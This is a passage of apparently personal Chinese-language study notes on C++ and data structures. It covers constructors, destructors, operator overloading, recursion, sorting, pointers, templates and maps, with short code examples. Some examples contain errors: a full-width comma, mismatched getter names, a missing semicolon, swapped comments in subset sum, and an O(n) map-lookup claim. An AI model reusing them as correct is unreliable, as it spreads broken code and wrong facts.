other);</span><br></pre></td></tr></tbody></table></figure><ul><li><p>拷贝构造函数的参数使用的是<strong>引用</strong>（<code>&amp;</code>），而不是按值传递，这是因为按值传递会调用另一个拷贝构造函数来传递参数，这样就会导致<strong>无限递归调用</strong>。</p></li><li><p>使用 <code>const</code>修饰引用是为了防止在拷贝过程中对传入的对象进行修改。</p></li><li><p>使用 <code>const</code>还能确保拷贝构造函数可以处理<strong>临时对象</strong>（即右值）。如果不加<code>const</code>，则不能对一个临时对象（如<code>HeapPQueue()</code>）进行拷贝，因为临时对象无法绑定到非<code>const</code> 引用。示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapPQueue hq1 = <span class="built_in">HeapPQueue</span>();  <span class="comment">// 临时对象可以绑定到 const 引用</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p>拷贝构造函数会在以下情况下被调用：</p><ol type="1"><li><p><strong>对象的按值传递</strong>：当一个对象通过值传递给函数时，C++会创建该对象的副本，调用拷贝构造函数。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(MyClass obj)</span></span>;  <span class="comment">// obj 作为参数，是按值传递的，会调用拷贝构造函数</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>对象作为返回值按值返回</strong>：当一个对象从函数中按值返回时，也会调用拷贝构造函数。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MyClass <span class="title">bar</span><span class="params">()</span> </span>{</span><br><span class="line">    MyClass obj;</span><br><span class="line">    <span class="keyword">return</span> obj;  <span class="comment">// 按值返回，调用拷贝构造函数</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>用现有对象初始化新对象</strong>：当用一个现有对象来初始化另一个对象时（例如通过赋值），也会调用拷贝构造函数。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyClass obj1;</span><br><span class="line">MyClass obj2 = obj1;  <span class="comment">// obj2 是用 obj1 初始化的，调用拷贝构造函数</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>对象被放入 STL 容器</strong>：当你将对象放入 STL 容器（如<code>std::vector</code>、<code>std::map</code>等）中时，这些容器可能会通过拷贝构造函数来复制对象。</p></li></ol><h4 id="析构函数">析构函数</h4><blockquote><p><strong>析构函数</strong>的作用是在对象的生命周期结束时执行清理工作，特别是释放对象持有的动态资源（例如内存、文件句柄、网络连接等）。它确保在对象销毁时，相关的资源能够被正确释放，避免内存泄漏等问题。</p><p>如果类中没有显式定义析构函数，编译器会生成一个<strong>默认的析构函数</strong>，但这个默认析构函数只会销毁基本数据类型和自动管理的成员。如果类中包含动态分配的内存或其他需要手动管理的资源，默认析构函数不会释放这些资源，可能会导致<strong>内存泄漏</strong>或<strong>资源泄露</strong>。</p></blockquote><ol type="1"><li><p>定义</p><p>析构函数的名字是类名的前面加一个波浪号<code>~</code>，并且它没有参数和返回值。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~<span class="built_in">ClassName</span>() {</span><br><span class="line">    <span class="comment">// 清理工作，如释放动态内存</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>调用：</p><ul><li>当对象离开作用域时，自动调用析构函数。</li><li>如果对象是通过 <code>new</code> 分配的，当对其调用<code>delete</code> 时，析构函数会被调用。</li><li>当一个类的对象在程序结束时被销毁，析构函数会自动调用。</li></ul><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> *data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() {</span><br><span class="line">        data = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];  <span class="comment">// 动态分配内存</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">MyClass</span>() {</span><br><span class="line">        <span class="keyword">delete</span>[] data;  <span class="comment">// 释放内存，防止内存泄漏</span></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="接口与实现分离">接口与实现分离</h4><ul><li><p>将类的定义以及类的函数原型写在<code>.h</code>文件中，如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * File: point.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _point_h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _point_h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>();</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> xc, <span class="type">int</span> yc);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>#ifndef _point_h</code>：如果符号 <code>_point_h</code>没有定义，则继续编译。</p><p><code>#define _point_h</code>：定义符号<code>_point_h</code>，防止后续重复包含。</p><p><code>#endif</code>：结束条件编译，确保头文件内容只被编译一次。</p><p>上述代码是为了防止“重复定义”错误</p></blockquote></li><li><p>将函数的具体实现写在<code>.cpp</code>文件中（注意函数名前要加类名作为限定符），如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * File: point.cpp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"point.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>() {</span><br><span class="line">    x = <span class="number">0</span>;</span><br><span class="line">    y = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">int</span> xc，<span class="type">int</span> yc) {</span><br><span class="line">    x = xc;</span><br><span class="line">    y = yc;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Point::getX</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Point::gety</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="运算符重载">运算符重载</h3><ul><li><p>重载的运算符是带有特殊名称的函数，函数名是由关键字 operator和其后要重载的运算符符号构成的，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point <span class="keyword">operator</span>+(Point p1, Point p2);</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>&lt;&lt;</code>运算符也可以参与重载，难点在于该运算符的类型，它通常和<code>std::ostream</code> 类型结合使用，示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp; os, Point point) {   <span class="comment">// 这里的 &amp; 是必须要添加的</span></span><br><span class="line">    <span class="comment">// os表示输出流对象，可以是 std::cout 或文件输出流</span></span><br><span class="line">    os &lt;&lt; <span class="string">"("</span> &lt;&lt; point.x &lt;&lt; <span class="string">", "</span> &lt;&lt; point.y &lt;&lt; <span class="string">")"</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果不返回 <code>std::ostream &amp;</code>，而是返回<code>std::ostream</code>（即按值返回），则每次 <code>&lt;&lt;</code>操作都会创建一个新的 <code>std::ostream</code>对象，丢失原始流的上下文信息</p></blockquote></li><li><p><code>==</code>运算符重载，下面以Point类为例，假设该函数属于类的成员，因此可以访问私有变量x和y</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> Point::<span class="keyword">operator</span>==(Point rhs) {   <span class="comment">// 若在类内实现该函数则省略“Point”前缀</span></span><br><span class="line">   <span class="keyword">return</span> x == rhs.x &amp;&amp; y == rhs.y; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>++</code>运算符重载需要注意是前缀还是后缀，后缀情况下（<code>i++</code>），参数里需要添加<code>int</code>，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Direction <span class="keyword">operator</span>++(Direction &amp; dir, <span class="type">int</span>) {  </span><br><span class="line">   Direction old = dir; </span><br><span class="line">   dir = <span class="built_in">Direction</span>(dir + <span class="number">1</span>); </span><br><span class="line">   <span class="keyword">return</span> old;  <span class="comment">// ++ 作为后缀，则操作数先返回原值在自增</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="友元函数">友元函数</h3><p>类的友元函数在类中声明，但不属于类的成员，但有权访问类的所有私有（private）成员和保护（protected）成员。</p><ul><li><p>友元函数在类中声明时需要添加<code>friend</code>前缀</p></li><li><p>示例，若<code>==</code>运算符不是Point类的成员但是想要访问私有成员，则需要在类中声明</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">friend</span> <span class="keyword">operator</span>==(Point rhs);</span><br></pre></td></tr></tbody></table></figure></li><li><p>友元类：可以访问另一个类的成员</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Point</span>; <span class="comment">// Point可以访问Building类中的成员</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Building</span>();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string str;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="chapter-7">Chapter 7</h2><p>递归</p><h2 id="chapter-8">Chapter 8</h2><h3 id="汉诺塔问题">汉诺塔问题</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">moveTower</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> start, <span class="type">char</span> finish, <span class="type">char</span> tmp)</span> </span>{ </span><br><span class="line">   <span class="keyword">if</span> (n == <span class="number">1</span>) { </span><br><span class="line">      Move a single disk from start to finish. </span><br><span class="line">   } <span class="keyword">else</span> { </span><br><span class="line">      Move a tower of size n - <span class="number">1</span> from start to tmp. </span><br><span class="line">      Move a single disk from start to finish. </span><br><span class="line">      Move a tower of size n - <span class="number">1</span> from tmp to finish. </span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="子集求和">子集求和</h3><p>每个元素有两种可能：在子集内，不在子集内</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">subsetSumExists</span><span class="params">(Set&lt;<span class="type">int</span>&gt; &amp; set, <span class="type">int</span> target)</span> </span>{ </span><br><span class="line">   <span class="keyword">if</span> (set.<span class="built_in">isEmpty</span>()) { </span><br><span class="line">      <span class="keyword">return</span> target == <span class="number">0</span>; </span><br><span class="line">   } <span class="keyword">else</span> { </span><br><span class="line">      <span class="type">int</span> element = set.<span class="built_in">first</span>(); </span><br><span class="line">      Set&lt;<span class="type">int</span>&gt; rest = set - element; </span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">subsetSumExists</span>(rest, target)   <span class="comment">// 在子集内</span></span><br><span class="line">          || <span class="built_in">subsetSumExists</span>(rest, target - element);  <span class="comment">// 不在子集内</span></span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="排列">排列</h3><p>例如<code>ABC</code>的排列是<code>{ "ABC", "ACB", "BAC", "BCA", "CAB", "CBA" }</code></p><p>若是对n个字符进行排列，可先选取一个字符，然后对剩余的 n-1个字符进行排列</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">set&lt;string&gt; <span class="title">generatePermutations</span><span class="params">(string str)</span> </span>{</span><br><span class="line">    set&lt;string&gt; ans;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="string">""</span>)</span><br><span class="line">        ans.<span class="built_in">insert</span>(str);</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;str.<span class="built_in">length</span>(); i++) {</span><br><span class="line">            <span class="type">char</span> c = str[i];</span><br><span class="line">            string rest = str.<span class="built_in">substr</span>(<span class="number">0</span>, i) + str.<span class="built_in">substr</span>(i+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(string s : <span class="built_in">generatePermutations</span>(rest)) {   <span class="comment">// 递归</span></span><br><span class="line">                ans.<span class="built_in">insert</span>(c+s);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="chapter-9">Chapter 9</h2><p>回溯算法</p><h2 id="chapter-10">Chapter 10</h2><p>算法分析</p><h3 id="big-o">big-O</h3><p>描述算法的时间复杂度</p><h3 id="选择算法">选择算法</h3><ul><li>选取 [i, n-1] 区间内最小/最大的元素与i处的元素交换次序</li><li>排序趟数与序列的原始状态无关</li><li>比较次数也与序列初始状态无关</li><li>时间复杂度：O(n<sup>2</sup>)</li></ul><h3 id="归并排序">归并排序</h3><ul><li><p>先从中间划分两个子序列，对左侧子序列递归排序，对右侧子序列递归排序，归并</p></li><li><p>时间复杂度：O(nlogn)</p></li></ul><h3 id="不同时间复杂度">不同时间复杂度</h3><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240926125413614.png" alt="image-20240926125413614"><figcaption aria-hidden="true">image-20240926125413614</figcaption></figure><h3 id="快速排序">快速排序</h3><p>归并排序在实践中用的不多。快速排序也用到了分治的思想。</p><ul><li>最简单的策略是选择向量中的第一个元素作为枢轴</li><li>两端有low和high指针，一趟排序结束后分为两个子序列。枢轴处于其最终位置</li><li>若是从小到大排序，则枢轴左边的子序列所有值小于枢轴右边的子序列所有值</li><li>详细步骤：<ul><li>先移动high指针找到比枢轴小的元素。若找不到则会与low重合</li><li>若找到满足条件的元素，high指针停止移动，开始移动low指针找到比枢轴大的元素，若找不到则会与high重合</li><li>若找到满足条件的元素，且两个指针未重合，交换两个指针指向的元素</li><li>若两个指针重合且low指向的元素小于枢轴元素，则交换两个元素</li></ul></li><li>平均时间复杂度：O(nlogn)</li><li>最坏情况——有序：O(n<sup>2</sup>)</li></ul><h2 id="chapter-11">Chapter 11</h2><p>指针与数组</p><h3 id="二进制和十六进制">二进制和十六进制</h3><ul><li>无符号数</li><li>有符号数（补码）</li><li>内存地址一般用十六进制表示</li></ul><h3 id="内存">内存</h3><ul><li>进程地址空间</li><li>栈帧：<strong>函数调用</strong>期间保存在栈中的数据结构，用于存储参数、局部变量和返回地址等</li></ul><h3 id="指针">指针</h3><p>存放内存地址的数据项被称为指针</p><h4 id="指针声明">指针声明</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p; <span class="comment">// 指向int的指针</span></span><br></pre></td></tr></tbody></table></figure><ul><li><p><code>* + 指针名</code>：获取指针指向的值</p></li><li><p><code>&amp; + 变量名</code>：获取该变量所在的内存地址</p></li><li><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">int</span> *p1, *p2;</span><br><span class="line">x = <span class="number">42</span>;</span><br><span class="line">y = <span class="number">163</span>;</span><br><span class="line">p1 = &amp;y;  <span class="comment">// 使p1指向y</span></span><br><span class="line">p2 = &amp;x;  <span class="comment">// 使p2指向x</span></span><br></pre></td></tr></tbody></table></figure><p>经过以上操作后，内存如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20241010145846709.png"></p></li><li><p>若要修改<code>y</code>的值，可以使用下面的语句：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*p1 = <span class="number">17</span>;</span><br></pre></td></tr></tbody></table></figure></li><li><p>当指针指向一个对象时，可通过<code>-&gt;</code>以及<code>.</code>来访问该对象的成员，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Point <span class="title">pt</span><span class="params">(<span class="number">3</span>, <span class="number">4</span>)</span></span>; </span><br><span class="line">Point *pp = &amp;pt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面两行是等价的</span></span><br><span class="line">(*pp).<span class="built_in">getX</span>();</span><br><span class="line">pp-&gt;<span class="built_in">getX</span>();</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="关键字-this">关键字 <code>this</code></h3><ul><li><p><code>this</code>是指向当前变量的指针</p></li><li><p>使用<code>this</code>可以避免类中构造函数中的变量冲突，同时方便用户理解：</p></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Point</span>(<span class="type">int</span> x, <span class="type">int</span> y) { </span><br><span class="line">   <span class="keyword">this</span>-&gt;x = x; </span><br><span class="line">   <span class="keyword">this</span>-&gt;y = y; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="空指针">空指针</h3><ul><li>使用常量<code>NULL</code>表示空指针</li><li>对空指针使用<code>*</code>运算符是违法的</li></ul><h3 id="引用">引用</h3><ul><li><p>将参数通过引用进行传递时，栈帧会存储指针，指针指向该值所在的调用函数中的位置。对该值的任何更改在函数返回后仍然有效</p></li><li><p>不使用引用，而是直接通过指针进行swap操作：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> *px, <span class="type">int</span> *py)</span> </span>{ </span><br><span class="line">    <span class="type">int</span> tmp = *px; </span><br><span class="line">    *px = *py; </span><br><span class="line">    *py = tmp; </span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">swap</span>(&amp;n1, &amp;n2); </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>指针引用：例如<code>int* &amp; p;</code>表示对指针p的引用</p></li></ul><h3 id="数组">数组</h3><ul><li><p>数组定义：<code>type name[size];</code></p></li><li><p>数组元素访问通过数组下标（索引）</p></li><li><p>通过<code>sizeof</code>获取数组长度以及元素大小</p></li><li><p>数组名称与指向初始元素的指针相同</p></li><li><p>数组作为参数被调用时，与引用的效果相同，例如下面的代码能够对传入的数组进行排序</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(<span class="type">int</span> array[], <span class="type">int</span> n)</span> </span>{   <span class="comment">// 或者写成 void sort(int *array, int n) </span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> lh = <span class="number">0</span>; lh &lt; n; lh++) { </span><br><span class="line">      <span class="type">int</span> rh = lh; </span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = lh + <span class="number">1</span>; i &lt; n; i++) { </span><br><span class="line">         <span class="keyword">if</span> (array[i] &lt; array[rh]) rh = i; </span><br><span class="line">      } </span><br><span class="line">      <span class="built_in">swap</span>(array[lh], array[rh]); </span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>字符数组使用<code>strcpy</code>函数时，没有尝试检查目标是否有足够的空间来保存源字符串的副本。如果没有足够的内存来保存完整的字符串，其他特殊用途的内存可能会被覆盖。这种形式的问题称为缓冲区溢出错误</p></li></ul><h2 id="chapter-12">Chapter 12</h2><p>动态内存管理</p><ul><li>动态内存管理是对<strong>堆</strong>进行操作</li><li>vector、map等集合类都是存放在堆上的</li></ul><h3 id="new操作符"><code>new</code>操作符</h3><ul><li><p><code>new</code>操作符从<strong>堆</strong>中分配内存，会返回堆中为保存对象而留出的存储位置的<strong>地址</strong>，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *ip = <span class="keyword">new</span> <span class="type">int</span>;   <span class="comment">// 等号右边返回的是内存指针</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>动态数组：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> *array = <span class="keyword">new</span> <span class="type">double</span>[<span class="number">3</span>];</span><br></pre></td></tr></tbody></table></figure></li><li><p>动态对象：在堆上为 Rational 对象分配空间并调用缺省构造函数</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rational *rp = <span class="keyword">new</span> Rational;</span><br></pre></td></tr></tbody></table></figure><p>若在类型名称后面提供参数，则会调用对应的构造函数</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rational *rp = <span class="keyword">new</span> <span class="built_in">Rational</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="chapter-13">Chapter 13</h2><h3 id="文本编辑软件模式">文本编辑软件模式</h3><ul><li><strong>MVC</strong>模式：model-view-controller。以手机文本编辑软件为例，键盘代表控制器，显示器代表视图，底层数据结构代表模型</li><li>大多数编辑器都是使用模型-视图-控制器模式设计的。在模型内部，编辑器维护一个字符序列，通常称为缓冲区。控制器允许您对缓冲区的内容执行各种操作</li></ul><h3 id="数组栈链表">数组、栈、链表</h3><p>三种方法实现文本编辑功能在效率上的区别</p><ul><li>数组：插入和删除操作需要O(n)</li><li>栈：分为光标左右两个栈，光标移动到开头和结尾需要O(n)</li><li>单链表：光标向左移动和移动到结尾需要O(n)</li><li>双链表：解决上述单链表的缺点，上述两个操作只需要 O(1)时间复杂度</li></ul><h2 id="chapter-14">Chapter 14</h2><p>模板</p><h3 id="模板函数">模板函数</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> ValueType&gt;  <span class="comment">// ValueType是占位符，表示数据类型</span></span><br><span class="line"><span class="function">ValueType <span class="title">max</span><span class="params">(ValueType x, ValueType y)</span> </span>{ </span><br><span class="line">   <span class="keyword">return</span> (x &gt; y) ? x : y; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>每当编译器遇到一个模板函数应用于它尚未处理过的类型时，它都会生成一个适用于该类型的函数体的全新副本。因此，如果在同一程序中对int、double、char、string使用max函数，编译器将生成四个代码副本，每种类型一个。</p><p>“模板”提供的是一种模式，使得编译器可以在需要时从中生成专门定制的版本。</p><blockquote><p><code>template &lt;class T&gt;</code>：这是早期 C++规范中的写法，<code>class</code> 关键字用于定义模板参数的类型。</p><p><code>template &lt;typename T&gt;</code>：这是 C++标准化后引入的一种更加语义化的写法，<code>typename</code>关键字强调模板参数表示的是一种类型</p></blockquote><h3 id="模板类">模板类</h3><ul><li><p>在类定义前一行添加<code>template &lt;typename ValueType&gt;</code>，那么类中的所有成员函数都会自动使用这个模板参数<code>T</code>，因为这个模板参数是与类绑定的。你不需要再为每个成员函数重新声明<code>template &lt;typename ValueType&gt;</code>。</p></li><li><p>在模板类中如果你只是声明了函数，并打算在类的<strong>外部</strong>实现它，那么在实现时需要在函数定义之前<strong>添加</strong><code>template&lt;typename T&gt;</code>。示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">void</span> MyClass&lt;T&gt;::<span class="built_in">show</span>() { <span class="comment">// 注意指明该函数是属于MyClass的成员函数</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Data: "</span> &lt;&lt; data &lt;&lt; std::endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="chapter-15">Chapter 15</h2><h3 id="maps">Maps</h3><ul><li>映射：通过查找map查找元素，时间复杂度为O(n)</li></ul><h3 